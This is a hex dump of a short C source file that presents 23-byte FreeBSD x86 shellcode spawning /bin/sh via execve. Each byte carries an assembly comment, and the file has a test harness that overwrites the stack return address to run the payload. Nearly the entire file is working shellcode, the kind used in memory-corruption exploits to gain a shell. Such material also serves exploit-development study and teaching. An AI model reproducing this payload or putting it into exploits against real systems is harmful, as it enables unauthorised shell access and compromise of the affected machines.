00000000  2f 2a 0d 0a 0d 0a 20 2a  0d 0a 20 2a 20 46 72 65  |/*.... *.. * Fre|
00000010  65 42 53 44 5f 78 38 36  2d 65 78 65 63 76 65 5f  |eBSD_x86-execve_|
00000020  73 68 2d 32 33 62 2d 69  5a 2e 63 20 28 53 68 65  |sh-23b-iZ.c (She|
00000030  6c 6c 63 6f 64 65 2c 20  65 78 65 63 76 65 20 2f  |llcode, execve /|
00000040  62 69 6e 2f 73 68 2c 20  32 33 20 62 79 74 65 73  |bin/sh, 23 bytes|
00000050  29 0d 0a 20 2a 0d 0a 20  2a 20 62 79 20 49 5a 20  |).. *.. * by IZ |
00000060  3c 67 75 65 72 72 69 6c  6c 61 2e 73 79 74 65 73  |<guerrilla.sytes|
00000070  2e 6e 65 74 3e 0d 0a 20  2a 0d 0a 20 2a 2f 0d 0a  |.net>.. *.. */..|
00000080  0d 0a 0d 0a 63 68 61 72  20 73 65 74 72 65 75 69  |....char setreui|
00000090  64 63 6f 64 65 5b 5d 20  3d 0d 0a 0d 0a 22 5c 78  |dcode[] =...."\x|
000000a0  33 31 5c 78 63 30 22 20  20 20 20 20 20 20 20 20  |31\xc0"         |
000000b0  20 20 20 20 20 20 20 20  20 2f 2a 20 78 6f 72 20  |         /* xor |
000000c0  25 65 61 78 2c 25 65 61  78 20 2a 2f 0d 0a 22 5c  |%eax,%eax */.."\|
000000d0  78 35 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x50"            |
000000e0  20 20 20 20 20 20 20 20  20 20 2f 2a 20 70 75 73  |          /* pus|
000000f0  68 20 25 65 61 78 20 2a  2f 0d 0a 22 5c 78 36 38  |h %eax */.."\x68|
00000100  5c 78 32 66 5c 78 32 66  5c 78 37 33 5c 78 36 38  |\x2f\x2f\x73\x68|
00000110  22 20 20 20 20 20 20 2f  2a 20 70 75 73 68 20 24  |"      /* push $|
00000120  30 78 36 38 37 33 32 66  32 66 20 28 2f 2f 73 68  |0x68732f2f (//sh|
00000130  29 20 2a 2f 0d 0a 22 5c  78 36 38 5c 78 32 66 5c  |) */.."\x68\x2f\|
00000140  78 36 32 5c 78 36 39 5c  78 36 65 22 20 20 20 20  |x62\x69\x6e"    |
00000150  20 20 2f 2a 20 70 75 73  68 20 24 30 78 36 65 36  |  /* push $0x6e6|
00000160  39 36 32 32 66 20 28 2f  62 69 6e 29 2a 2f 0d 0a  |9622f (/bin)*/..|
00000170  0d 0a 22 5c 78 38 39 5c  78 65 33 22 20 20 20 20  |.."\x89\xe3"    |
00000180  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
00000190  20 6d 6f 76 20 25 65 73  70 2c 25 65 62 78 20 2a  | mov %esp,%ebx *|
000001a0  2f 0d 0a 22 5c 78 35 30  22 20 20 20 20 20 20 20  |/.."\x50"       |
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000001c0  2a 20 70 75 73 68 20 25  65 61 78 20 2a 2f 0d 0a  |* push %eax */..|
000001d0  22 5c 78 35 34 22 20 20  20 20 20 20 20 20 20 20  |"\x54"          |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 70  |            /* p|
000001f0  75 73 68 20 25 65 73 70  20 2a 2f 0d 0a 22 5c 78  |ush %esp */.."\x|
00000200  35 33 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |53"             |
00000210  20 20 20 20 20 20 20 20  20 2f 2a 20 70 75 73 68  |         /* push|
00000220  20 25 65 62 78 20 2a 2f  0d 0a 0d 0a 22 5c 78 35  | %ebx */...."\x5|
00000230  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
00000240  20 20 20 20 20 20 20 20  2f 2a 20 70 75 73 68 20  |        /* push |
00000250  25 65 61 78 20 2a 2f 0d  0a 22 5c 78 62 30 5c 78  |%eax */.."\xb0\x|
00000260  33 62 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |3b"             |
00000270  20 20 20 20 20 2f 2a 20  6d 6f 76 20 24 30 78 33  |     /* mov $0x3|
00000280  62 2c 25 61 6c 20 2a 2f  0d 0a 22 5c 78 63 64 5c  |b,%al */.."\xcd\|
00000290  78 38 30 22 3b 20 20 20  20 20 20 20 20 20 20 20  |x80";           |
000002a0  20 20 20 20 20 20 2f 2a  20 69 6e 74 20 24 30 78  |      /* int $0x|
000002b0  38 30 20 2a 2f 0d 0a 0d  0a 0d 0a 76 6f 69 64 20  |80 */......void |
000002c0  6d 61 69 6e 28 29 0d 0a  7b 0d 0a 20 20 20 20 20  |main()..{..     |
000002d0  69 6e 74 2a 20 20 20 20  20 72 65 74 3b 20 20 20  |int*     ret;   |
000002e0  20 20 20 20 20 20 0d 0a  0d 0a 20 20 20 20 20 72  |      ....     r|
000002f0  65 74 20 3d 20 28 69 6e  74 2a 29 20 26 72 65 74  |et = (int*) &ret|
00000300  20 2b 20 32 3b 0d 0a 0d  0a 20 20 20 20 20 70 72  | + 2;....     pr|
00000310  69 6e 74 66 28 22 6c 65  6e 20 25 64 5c 6e 22 2c  |intf("len %d\n",|
00000320  73 74 72 6c 65 6e 28 73  65 74 72 65 75 69 64 63  |strlen(setreuidc|
00000330  6f 64 65 29 29 3b 0d 0a  0d 0a 20 20 20 20 20 28  |ode));....     (|
00000340  2a 72 65 74 29 20 3d 20  28 69 6e 74 29 20 73 65  |*ret) = (int) se|
00000350  74 72 65 75 69 64 63 6f  64 65 3b 20 0d 0a 7d     |treuidcode; ..}|
0000035f
